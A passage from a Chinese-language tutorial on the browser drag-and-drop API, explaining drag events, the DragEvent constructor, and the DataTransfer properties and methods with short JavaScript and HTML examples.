<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragleave&#x27;</span>, <span class="keyword">function</span>(<span class="params"> event </span>) &#123;</span><br><span class="line">  <span class="comment">// 目标节点的背景色恢复原样</span></span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">target</span>.<span class="property">className</span> === <span class="string">&#x27;dropzone&#x27;</span>) &#123;</span><br><span class="line">    event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;drop&#x27;</span>, <span class="keyword">function</span>(<span class="params"> event </span>) &#123;</span><br><span class="line">  <span class="comment">// 防止事件默认行为（比如某些元素节点上可以打开链接），</span></span><br><span class="line">  event.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">target</span>.<span class="property">className</span> === <span class="string">&#x27;dropzone&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 恢复目标节点背景色</span></span><br><span class="line">    event.<span class="property">target</span>.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// 将被拖拉节点插入目标节点</span></span><br><span class="line">    dragged.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(dragged);</span><br><span class="line">    event.<span class="property">target</span>.<span class="title function_">appendChild</span>( dragged );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>关于拖拉事件，有以下几个注意点。</p>
<ul>
<li>拖拉过程只触发以上这些拖拉事件，尽管鼠标在移动，但是<strong>鼠标事件不会触发</strong>。</li>
<li>将文件从操作系统拖拉进浏览器，不会触发<code>dragstart</code>和<code>dragend</code>事件。</li>
<li><code>dragenter</code>和<code>dragover</code>事件的监听函数，用来取出拖拉的数据（即允许放下被拖拉的元素）。由于网页的大部分区域不适合作为放下拖拉元素的目标节点，所以这两个事件的默认设置为当前节点不允许接受被拖拉的元素。<strong>如果想要在目标节点上放下的数据，首先必须阻止这两个事件的默认行为</strong>。</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ondragover</span>=<span class="string">&quot;return false&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ondragover</span>=<span class="string">&quot;event.preventDefault()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，如果不取消拖拉事件或者阻止默认行为，就不能在<code>div</code>节点上放下被拖拉的节点。	</p>
<h3 id="2、DragEvent-接口"><a href="#2、DragEvent-接口" class="headerlink" title="2、DragEvent 接口"></a>2、DragEvent 接口</h3><p><strong>拖拉事件都继承了<code>DragEvent</code>接口，这个接口又继承了<code>MouseEvent</code>接口和<code>Event</code>接口。</strong></p>
<p>浏览器原生提供一个<code>DragEvent()</code>构造函数，用来生成拖拉事件的实例对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">DragEvent</span>(type, options)</span><br></pre></td></tr></table></figure>

<p><code>DragEvent()</code>构造函数接受两个参数，第一个参数是<strong>字符串，表示事件的类型</strong>，该参数必须；第二个参数是事件的<strong>配置对象</strong>，用来设置事件的属性，该参数可选。配置对象除了接受<code>MouseEvent</code>接口和<code>Event</code>接口的配置属性，还可以<strong>设置<code>dataTransfer</code>属性要么是<code>null</code>，要么是一个<code>DataTransfer</code>接口的实例。</strong></p>
<p><code>DataTransfer</code>的实例对象用来读写拖拉事件中传输的数据，详见下文《DataTransfer 接口》的部分。</p>
<h3 id="3、DataTransfer-接口概述"><a href="#3、DataTransfer-接口概述" class="headerlink" title="3、DataTransfer 接口概述"></a>3、DataTransfer 接口概述</h3><p><strong>所有拖拉事件的实例都有一个<code>DragEvent.dataTransfer</code>属性，用来读写需要传递的数据</strong>。这个属性的值是一个<code>DataTransfer</code>接口的实例。</p>
<p>浏览器原生提供一个<code>DataTransfer()</code>构造函数，用来生成<code>DataTransfer</code>实例对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dataTrans = <span class="keyword">new</span> <span class="title class_">DataTransfer</span>();</span><br></pre></td></tr></table></figure>

<p><code>DataTransfer()</code>构造函数<strong>不接受参数</strong>。</p>
<p>拖拉的数据分成两方面：<strong>数据的种类（又称格式）和数据的值</strong>。数据的种类是一个 MIME 字符串（比如<code>text/plain</code>、<code>image/jpeg</code>），数据的值是一个字符串。一般来说，如果拖拉一段文本，则数据默认就是那段文本；如果拖拉一个链接，则数据默认就是链接的 URL。</p>
<p>拖拉事件开始时，开发者可以提供数据类型和数据值。拖拉过程中，开发者通过<code>dragenter</code>和<code>dragover</code>事件的监听函数，检查数据类型，以确定是否允许放下（drop）被拖拉的对象。比如，在只允许放下链接的区域，检查拖拉的数据类型是否为<code>text/uri-list</code>。</p>
<p><strong>发生<code>drop</code>事件时，监听函数取出拖拉的数据，对其进行处理。</strong></p>
<h3 id="4、DataTransfer-的实例属性"><a href="#4、DataTransfer-的实例属性" class="headerlink" title="4、DataTransfer 的实例属性"></a>4、DataTransfer 的实例属性</h3><h4 id="4-1-DataTransfer-dropEffect-设置接受拖拉的区域的效果"><a href="#4-1-DataTransfer-dropEffect-设置接受拖拉的区域的效果" class="headerlink" title="4.1 DataTransfer.dropEffect 设置接受拖拉的区域的效果"></a>4.1 DataTransfer.dropEffect 设置接受拖拉的区域的效果</h4><p><code>DataTransfer.dropEffect</code>属性<strong>用来设置放下（drop）被拖拉节点时的效果</strong>，会影响到拖拉经过相关区域时鼠标的形状。它可能取下面的值。</p>
<ul>
<li>copy：复制被拖拉的节点</li>
<li>move：移动被拖拉的节点</li>
<li>link：创建指向被拖拉的节点的链接</li>
<li>none：无法放下被拖拉的节点</li>
</ul>
<p>除了上面这些值，设置其他的值都是无效的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">target.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragover&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  e.<span class="title function_">stopPropagation</span>();</span><br><span class="line">  e.<span class="property">dataTransfer</span>.<span class="property">dropEffect</span> = <span class="string">&#x27;copy&#x27;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，被拖拉元素一旦<code>drop</code>，接受的区域会复制该节点。</p>
<p><code>dropEffect</code>属性一般<strong>在<code>dragenter</code>和<code>dragover</code>事件的监听函数中设置</strong>，对于<code>dragstart</code>、<code>drag</code>、<code>dragleave</code>这三个事件，该属性不起作用。因为该属性只对接受被拖拉的节点的区域有效，对被拖拉的节点本身是无效的。进入目标区域后，拖拉行为会初始化成设定的效果。</p>
<h4 id="4-2-DataTransfer-effectAllowed-设置被拖拉的节点允许的效果"><a href="#4-2-DataTransfer-effectAllowed-设置被拖拉的节点允许的效果" class="headerlink" title="4.2 DataTransfer.effectAllowed 设置被拖拉的节点允许的效果"></a>4.2 DataTransfer.effectAllowed 设置被拖拉的节点允许的效果</h4><p><code>DataTransfer.effectAllowed</code>属性<strong>设置本次拖拉中允许的效果</strong>。它可能取下面的值。</p>
<ul>
<li>copy：复制被拖拉的节点</li>
<li>move：移动被拖拉的节点</li>
<li>link：创建指向被拖拉节点的链接</li>
<li>copyLink：允许<code>copy</code>或<code>link</code></li>
<li>copyMove：允许<code>copy</code>或<code>move</code></li>
<li>linkMove：允许<code>link</code>或<code>move</code></li>
<li>all：允许所有效果</li>
<li>none：无法放下被拖拉的节点</li>
<li>uninitialized：默认值，等同于<code>all</code></li>
</ul>
<p>如果某种效果是不允许的，用户就无法在目标节点中达成这种效果。</p>
<p><strong>这个属性与<code>dropEffect</code>属性是同一件事的两个方面。前者设置被拖拉的节点允许的效果，后者设置接受拖拉的区域的效果，它们往往配合使用。</strong></p>
<p><strong><code>dragstart</code>事件的监听函数，可以用来设置这个属性</strong>。其他事件的监听函数里面设置这个属性是无效的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">source.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragstart&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123; <span class="comment">// 被拖拉节点上设置</span></span><br><span class="line">  e.<span class="property">dataTransfer</span>.<span class="property">effectAllowed</span> = <span class="string">&#x27;move&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">target.<span class="title function_">addEventListener</span>(<span class="string">&#x27;dragover&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123; <span class="comment">// 接受区域节点上设置</span></span><br><span class="line">  e.<span class="property">dataTransfer</span>.<span class="property">dropEffect</span> = <span class="string">&#x27;move&#x27;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>只要<code>dropEffect</code>属性和<code>effectAllowed</code>属性之中，有一个为<code>none</code>，就无法在目标节点上完成<code>drop</code>操作。</p>
<h4 id="4-3-DataTransfer-files-本地文件"><a href="#4-3-DataTransfer-files-本地文件" class="headerlink" title="4.3 DataTransfer.files 本地文件"></a>4.3 DataTransfer.files 本地文件</h4><p><code>DataTransfer.files</code>属性是<strong>一个 FileList 对象，包含一组本地文件</strong>，可以用来在拖拉操作中传送。如果本次拖拉不涉及文件，则该属性为空的 FileList 对象。</p>
<h5 id="例子：接收拖拉文件"><a href="#例子：接收拖拉文件" class="headerlink" title="例子：接收拖拉文件"></a>例子：接收拖拉文件</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;output&quot; style=&quot;min-height: 200px;border: 1px solid black;&quot;&gt;</span></span><br><span class="line"><span class="comment">//   文件拖拉到这里</span></span><br><span class="line"><span class="comment">// &lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;output&#x27;</span>);</span><br><span class="line"></span><br><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&quot;dragenter&quot;</span>, <span class="keyword">function</span>(<span class="params"> event </span>) &#123;</span><br><span class="line">  div.<span class="property">textContent</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  event.<span class="title function_">stopPropagation</span>();</span><br><span class="line">  event.<span class="title function_">preventDefault</span>();</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&quot;dragover&quot;</span>, <span class="keyword">function</span>(<span class="params"> event </span>) &#123;</span><br><span class="line">  event.<span class="title function_">stopPropagation</span>();</span><br><span class="line">  event.<span class="title function_">preventDefault</span>();</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&quot;drop&quot;</span>, <span class="keyword">function</span>(<span class="params"> event </span>) &#123;</span><br><span class="line">  event.<span class="title function_">stopPropagation</span>();</span><br><span class="line">  event.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="keyword">var</span> files = event.<span class="property">dataTransfer</span>.<span class="property">files</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    div.<span class="property">textContent</span> += files[i].<span class="property">name</span> + <span class="string">&#x27; &#x27;</span> + files[i].<span class="property">size</span> + <span class="string">&#x27;字节\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，通过<code>dataTransfer.files</code>属性读取被拖拉的文件的信息。如果想要<strong>读取文件内容，就要使用<code>FileReader</code>对象。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;drop&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  e.<span class="title function_">stopPropagation</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> fileList = e.<span class="property">dataTransfer</span>.<span class="property">files</span>;</span><br><span class="line">  <span class="keyword">if</span> (fileList.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = fileList[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line">    reader.<span class="title function_">readAsDataURL</span>(file);<span class="comment">// 解析为url</span></span><br><span class="line">    reader.<span class="property">onloadend</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">target</span>.<span class="property">readyState</span> === <span class="title class_">FileReader</span>.<span class="property">DONE</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> content = reader.<span class="property">result</span>;</span><br><span class="line">        div.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;img src=&quot;&#x27;</span>+ content +<span class="string">&#x27;&quot;&gt; File: &#x27;</span> + file.<span class="property">name</span> + <span class="string">&#x27;\n\n&#x27;</span> + content;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    reader.<span class="title function_">readAsBinaryString</span>(file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h4 id="4-4-DataTransfer-types-数据格式"><a href="#4-4-DataTransfer-types-数据格式" class="headerlink" title="4.4 DataTransfer.types 数据格式"></a>4.4 DataTransfer.types 数据格式</h4><p><code>DataTransfer.types</code>属性<strong>是一个只读的数组</strong>，每个成员是一个字符串，里面是<strong>拖拉的数据格式</strong>（通常是 MIME 值）。比如，如果拖拉的是文字，对应的成员就是<code>text/plain</code>。</p>
<p>下面是一个例子，通过检查<code>dataTransfer</code>属性的类型，决定是否允许在当前节点执行<code>drop</code>操作。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">contains</span>(<span class="params">list, value</span>)&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.<span class="property">length</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span>(list[i] === value) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doDragOver</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> isLink = <span class="title function_">contains</span>(event.<span class="property">dataTransfer</span>.<span class="property">types</span>, <span class="string">&#x27;text/uri-list&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (isLink) event.<span class="title function_">preventDefault</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，只有当被拖拉的节点是一个链接时，才允许在当前节点放下。</p>
<h4 id="4-5-DataTransfer-items"><a href="#4-5-DataTransfer-items" class="headerlink" title="4.5 DataTransfer.items"></a>4.5 DataTransfer.items</h4><p><code>DataTransfer.items</code>属性<strong>返回一个类似数组的只读对象（DataTransferItemList 实例）</strong>，每个成员就是本次拖拉的一个对象（DataTransferItem 实例）。如果本次拖拉不包含对象，则返回一个空对象。</p>
<p>DataTransferItemList 实例具有以下的属性和方法。</p>
<ul>
<li><code>length</code>：返回成员的数量</li>
<li><code>add(data, type)</code>：增加一个指定内容和类型（比如<code>text/html</code>和<code>text/plain</code>）的字符串作为成员</li>
<li><code>add(file)</code>：<code>add</code>方法的另一种用法，增加一个文件作为成员</li>
<li><code>remove(index)</code>：移除指定位置的成员</li>
<li><code>clear()</code>：移除所有的成员</li>
</ul>
<p>DataTransferItem 实例具有以下的属性和方法。</p>
<ul>
<li><code>kind</code>：返回成员的种类（<code>string</code>还是<code>file</code>）。</li>
<li><code>type</code>：返回成员的类型（通常是 MIME 值）。</li>
<li><code>getAsFile()</code>：如果被拖拉是文件，返回该文件，否则返回<code>null</code>。</li>
<li><code>getAsString(callback)</code>：如果被拖拉的是字符串，将该字符传入指定的回调函数处理。该方法是异步的，所以需要传入回调函数。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;drop&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">dataTransfer</span>.<span class="property">items</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; e.<span class="property">dataTransfer</span>.<span class="property">items</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">dataTransfer</span>.<span class="property">items</span>[i].<span class="property">kind</span> + <span class="string">&#x27;: &#x27;</span> + e.<span class="property">dataTransfer</span>.<span class="property">items</span>[i].<span class="property">type</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h3 id="5、DataTransfer-的实例方法"><a href="#5、DataTransfer-的实例方法" class="headerlink" title="5、DataTransfer 的实例方法"></a>5、DataTransfer 的实例方法</h3><h4 id="5-1-DataTransfer-setData-设置拖拉事件所带有的数据"><a href="#5-1-DataTransfer-setData-设置拖拉事件所带有的数据" class="headerlink" title="5.1 DataTransfer.setData() 设置拖拉事件所带有的数据"></a>5.1 DataTransfer.setData() 设置拖拉事件所带有的数据</h4><p><code>DataTransfer.setData()</code>方法用来<strong>设置拖拉事件所带有的数据</strong>。该方法没有返回值。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event.<span class="property">dataTransfer</span>.<span class="title function_">setData</span>(<span class="string">&#x27;text/plain&#x27;</span>, <span class="string">&#x27;Text to drag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码为当前的拖拉事件加入纯文本数据。</p>
<p>该方法接受两个参数，都是字符串。第一个参数<strong>表示数据类型</strong>（比如<code>text/plain</code>），第二个参数是<strong>具体数据</strong>。如果指定类型的数据在<code>dataTransfer</code>属性不存在，那么这些数据将被加入，否则原有的数据将被新数据替换。</p>
<p>如果是拖拉文本框或者拖拉选中的文本，会默认将对应的文本数据，添加到<code>dataTransfer</code>属性，不用手动指定。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">draggable</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">  aaa</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，拖拉这个<code> &lt;div&gt; </code>元素会自动带上文本数据<code>aaa</code>。</p>
<p>使用<code>setData</code>方法，可以替换到原有数据。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span></span></span><br><span class="line"><span class="tag">  <span class="attr">draggable</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">ondragstart</span>=<span class="string">&quot;event.dataTransfer.setData(&#x27;text/plain&#x27;, &#x27;bbb&#x27;)&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  aaa</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，拖拉数据实际上是<code>bbb</code>，而不是<code>aaa</code>。</p>
<p>下面是添加其他类型的数据。由于<code>text/plain</code>是最普遍支持的格式，为了保证兼容性，建议最后总是保存一份纯文本格式的数据。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dt = event.<span class="property">dataTransfer</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加链接</span></span><br><span class="line">dt.<span class="title function_">setData</span>(<span class="string">&#x27;text/uri-list&#x27;</span>, <span class="string">&#x27;http://www.example.com&#x27;</span>);</span><br><span class="line">dt.<span class="title function_">setData</span>(<span class="string">&#x27;text/plain&#x27;</span>, <span class="string">&#x27;http://www.example.com&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加 HTML 代码</span></span><br><span class="line">dt.<span class="title function_">setData</span>(<span class="string">&#x27;text/html&#x27;</span>, <span class="string">&#x27;Hello there, &lt;strong&gt;stranger&lt;/strong&gt;&#x27;</span>);</span><br><span class="line">dt.<span class="title function_">setData</span>(<span class="string">&#x27;text/plain&#x27;</span>, <span class="string">&#x27;Hello there, &lt;strong&gt;stranger&lt;/strong&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加图像的 URL</span></span><br><span class="line">dt.<span class="title function_">setData</span>(<span class="string">&#x27;text/uri-list&#x27;</span>, imageurl);</span><br><span class="line">dt.<span class="title function_">setData</span>(<span class="string">&#x27;text/plain&#x27;</span>, imageurl);</span><br></pre></td></tr></table></figure>

<p>可以一次提供多种格式的数据。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dt = event.<span class="property">dataTransfer</span>;</span><br><span class="line">dt.<span class="title function_">setData</span>(<span class="string">&#x27;application/x-bookmark&#x27;</span>, bookmarkString);</span><br><span class="line">dt.<span class="title function_">setData</span>(<span class="string">&#x27;text/uri-list&#x27;</span>, <span class="string">&#x27;http://www.example.com&#x27;</span>);</span><br><span class="line">dt.<span class="title function_">setData</span>(<span class="string">&#x27;text/plain&#x27;</span>, <span class="string">&#x27;http://www.example.com&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，通过在同一个事件上面，存放三种类型的数据，使得拖拉事件可以在不同的对象上面，<code>drop</code>不同的值。注意，第一种格式是一个自定义格式，浏览器默认无法读取，这意味着，只有某个部署了特定代码的节点，才可能<code>drop</code>（读取到）这个数据。</p>
<h4 id="5-2-DataTransfer-getData-返回指定类型的数据"><a href="#5-2-DataTransfer-getData-返回指定类型的数据" class="headerlink" title="5.2 DataTransfer.getData() 返回指定类型的数据"></a>5.2 DataTransfer.getData() 返回指定类型的数据</h4><p><code>DataTransfer.getData()</code>方法接受一个字符串（表示数据类型）作为参数，<strong>返回事件所带的指定类型的数据（通常是用<code>setData</code>方法添加的数据）</strong>。如果指定类型的数据不存在，则返回空字符串。通常只有<code>drop</code>事件触发后，才能取出数据。</p>
<p>下面是一个<code>drop</code>事件的监听函数，用来取出指定类型的数据。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onDrop</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> data = event.<span class="property">dataTransfer</span>.<span class="title function_">getData</span>(<span class="string">&#x27;text/plain&#x27;</span>);</span><br><span class="line">  event.<span class="property">target</span>.<span class="property">textContent</span> = data;</span><br><span class="line">  event.<span class="title function_">preventDefault</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码取出拖拉事件的文本数据，将其替换成当前节点的文本内容。注意，这时还必须取消浏览器的默认行为，因为假如用户拖拉的是一个链接，浏览器默认会在当前窗口打开这个链接。</p>
<p><code>getData</code>方法返回的是一个字符串，如果其中包含多项数据，就必须手动解析。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">doDrop</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> lines = event.<span class="property">dataTransfer</span>.<span class="title function_">getData</span>(<span class="string">&#x27;text/uri-list&#x27;</span>).<span class="title function_">split</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> line <span class="keyword">of</span> lines) &#123;</span><br><span class="line">    <span class="keyword">let</span> link = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    link.<span class="property">href</span> = line;</span><br><span class="line">    link.<span class="property">textContent</span> = line;</span><br><span class="line">    event.<span class="property">target</span>.<span class="title function_">appendChild</span>(link);</span><br><span class="line">  &#125;</span><br><span class="line">  event.<span class="title function_">preventDefault</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>getData</code>方法返回的是一组链接，就必须自行解析。</p>
<p>类型值指定为<code>URL</code>，可以取出第一个有效链接。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link = event.<span class="property">dataTransfer</span>.<span class="title function_">getData</span>(<span class="string">&#x27;URL&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>下面的例子是从多种类型的数据里面取出数据。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">doDrop</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> types = event.<span class="property">dataTransfer</span>.<span class="property">types</span>;</span><br><span class="line">  <span class="keyword">var</span> supportedTypes = [<span class="string">&#x27;text/uri-list&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>];</span><br><span class="line">  types = supportedTypes.<span class="title function_">filter</span>(<span class="keyword">function</span> (<span class="params">value</span>) &#123; types.<span class="title function_">includes</span>(value) &#125;);</span><br><span class="line">  <span class="keyword">if</span> (types.<span class="property">length</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> data = event.<span class="property">dataTransfer</span>.<span class="title function_">getData</span>(types[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  event.<span class="title function_">preventDefault</span>();</span><br><span 